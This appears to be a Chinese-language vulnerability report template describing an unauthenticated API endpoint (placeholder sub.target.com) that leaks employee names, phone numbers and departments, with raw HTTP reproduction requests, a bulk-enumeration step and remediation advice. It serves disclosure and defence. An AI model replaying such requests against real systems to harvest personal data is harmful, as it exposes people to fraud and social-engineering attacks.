# 【高风险】XXX系统未授权访问导致敏感信息泄露

## 1. 漏洞信息

| 项 | 内容 |
|---|---|
| 影响域名 | https://sub.target.com |
| 漏洞类型 | 未授权访问 / 敏感信息泄露 |
| 危害等级 | 高风险 |
| 是否需要登录 | 否 |
| 复现难度 | 低 |

## 2. 复现步骤

**步骤 1**：直接访问以下接口，无需任何认证信息

```
GET /api/v1/user/list?page=1&size=100 HTTP/1.1
Host: sub.target.com
User-Agent: Mozilla/5.0
（无 Cookie，无 Authorization）
```

**步骤 2**：服务器返回 200，响应体包含用户列表

```json
{
  "code": 0,
  "data": {
    "total": 32145,
    "list": [
      {"id":1,"name":"张*","phone":"138****1234","dept":"技术部"},
      ...
    ]
  }
}
```

**步骤 3**：修改 size 参数为 10000，仍正常返回，证明可批量遍历

```
GET /api/v1/user/list?page=1&size=10000 HTTP/1.1
```

## 3. 影响范围与危害

- 可未授权遍历全部 32145 条员工记录
- 泄露字段：真实姓名、手机号、部门、工号、邮箱
- 攻击者可批量导出，用于精准诈骗、社工攻击、撞库
- 该接口同时暴露内部组织架构，可辅助后续针对性攻击

## 4. 修复建议

1. 为该接口添加鉴权中间件，校验登录态与角色
2. 对返回字段做权限分级，非管理员不返回手机号等敏感字段
3. 增加分页上限（建议 max size = 100）
4. 增加接口访问频次限制
5. 排查同类 /api/v1/* 接口是否存在相同问题
